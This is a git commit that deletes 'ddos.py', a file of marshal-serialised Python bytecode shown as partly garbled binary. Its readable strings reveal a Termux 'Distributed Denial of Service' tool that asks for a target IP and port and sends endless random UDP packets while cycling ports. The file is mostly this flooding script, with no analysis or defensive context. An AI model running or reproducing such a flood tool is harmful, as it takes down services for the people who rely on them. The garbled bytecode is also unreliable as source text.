fb1a3175512202b8206c4c8fe215d98f749f8ee7
Cristi27288 <95190719+Cristi27288@users.noreply.github.com>
2022-05-25 20:27:02 +0300

    Delete ddos.py

--- ddos.py
+++
@@ -1,16 +0,0 @@
-ó
-bÚt_c           @   s!   d  d l  Z  e  j d ƒ d Ud S(   iÿÿÿÿNsÌ  c           @   s<  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l m Z e j ƒ  Z e j Z e j Z e j	 Z	 e j
- Z
- e j Z e j e j e j ƒ Z e j d ƒ Z e j d ƒ d GHd GHd GHd GHd	 GHd
- GHd GHd GHd GHd GHd GHd GHe d ƒ Z e d ƒ Z e j d ƒ d GHe j d ƒ e j d ƒ d GHe j d ƒ e j d ƒ d GHe j d ƒ e j d ƒ d GHe j d ƒ e j d ƒ d GHe j d ƒ e j d ƒ d GHe j d ƒ e j d ƒ d Z x[ e r7e j e e e f ƒ e d Z e d Z d e e e f GHe d k rÝd Z qÝqÝWd S(   iÿÿÿÿN(   t   datetimeiÒ  t   clears‡  [1;31m
-MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
-M       YMM M       YMM MMP     YMM MP       MM
-M  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M
-M  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM
-M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M
-M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M
-M        MM M        MM MMb     dMM Mb       dM
-MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMMs@   [41m[1;37m  Distributed Denial of Service - Termux Tools  [0mt    s%   [1;33mAuthor   : [1;37m0xfff1852#4935 s8   [1;33mGithub   : [1;37mhttps://github.com/Cristi27288 s=   [1;33mSource   : [1;37mhttps://github.com/Cristi27288/DDOS s#   [1;32mPress CTRL+C to stop sendings   [1;37m------------ [0ms   [1;37mINPUT TARGET [0ms$   [37m[*] [91mIP or HOSTNAME :[32m s$   [37m[*] [91mPORT SCANNING  :[32m s    Run DDOS Attack.i   s    Run DDOS Attack..s    Run DDOS Attack...i    s%   Sent %s packet to %s throught port:%siþÿ  (   t   syst   ost   timet   sockett   randomR    t   nowt   hourt   minutet   dayt   montht   yeart   AF_INETt
-   SOCK_DGRAMt   sockt   _urandomt   bytest   systemt	   raw_inputt   ipt   inputt   portt   sleept   sentt   Truet   sendto(    (    (    t    t   <module>   sn   							
-
-(   t   marshalt   loads(    (    (    s   ddos_.pyt   <module>   s   
